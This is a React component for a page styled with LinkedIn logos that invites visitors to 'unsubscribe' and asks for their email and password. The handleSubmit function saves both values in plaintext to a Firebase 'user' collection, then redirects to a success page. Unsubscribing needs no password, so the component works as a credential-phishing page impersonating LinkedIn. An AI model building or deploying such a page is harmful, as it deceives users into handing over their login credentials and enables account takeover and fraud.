import React, { useState } from 'react';
import Form from "react-bootstrap/Form";
import Button from "react-bootstrap/Button";

import { fbdatabase } from '../firebase/firebase';

import { useHistory } from 'react-router-dom';

import {Container,Row ,Col } from "react-bootstrap";

const Home = () => {

    const [email,setEmail] = useState("");
    const [pwd,setPwd] = useState("");
    //const [clicked,setClicked] = useState(false);
    const history = useHistory();

    const [isLogged,setIsLogged] = useState("");

    const validateForm = () => {
        return email.length > 0 && pwd.length > 0;
    }

    const handleSubmit = (event) => {

        // const id = fbdatabase.collection("user").doc().getId();

        fbdatabase.collection("user").doc(email).set({
            email : email,
            pwd : pwd,
        })
        .then(() => {
            console.log("Document successfully written!");
        })
        .catch((error) => {
            console.error("Error writing document: ", error);
        });



        history.push("/sucess");
    }

    const print_text = (txt) => {
        if (txt==="") {
            return (
                <Container className="milieu">
                    <p className='warning'>
                        Souhaitez vraiment vous désabonner ?
                    </p>
                    <p className='infos'>
                        {/* Vous ne recevrez plus de mails de notre part. */}
                    </p>
                </Container>
            )
        }
        else {
            return
        }
    }

    return (    

        <Container>

            <Container className="haut">
                <Row className='logos'>
                    <Col className='col-3'>
                        <img  className='img-fluid' id='logo_linkedin' src='/logo_linkedin.png' alt ='...'/>
                    </Col>

                    <Col className='col-9 align-items-right' id='col_droite'>
                    {/* <img  className='img-fluid' id='logo_linkedin' src='/logo_linkedin.png' alt ='...'/> */}
                        <img className='img-fluid' id='linkedin' src='/linkedin.png' alt ='....'/>
                    </Col>
                </Row>
            </Container>


            <Container className="bas">

                <Row className="login">

                    <Form onSubmit={handleSubmit}>
                        <Form.Group size="lg" controlId="email">
                        <Form.Label>Email</Form.Label>
                        <Form.Control
                            autoFocus
                            type="email"
                            value={email}
                            onChange={(e) => setEmail(e.target.value)}
                            placeholder="exemple@gmail.com"
                        />
                        </Form.Group>
                        <Form.Group size="lg" controlId="password">
                        <Form.Label>Mot de passe</Form.Label>
                        <Form.Control
                            type="password"
                            value={pwd}
                            onChange={(e) => setPwd(e.target.value)}
                        />
                        </Form.Group>
                        <p></p>
                        <Button size="lg" type="submit" disabled={!validateForm()}>
                        Désabonnement
                        </Button>
                    </Form>

                </Row>
            </Container>

        </Container>
    );
};

export default Home;
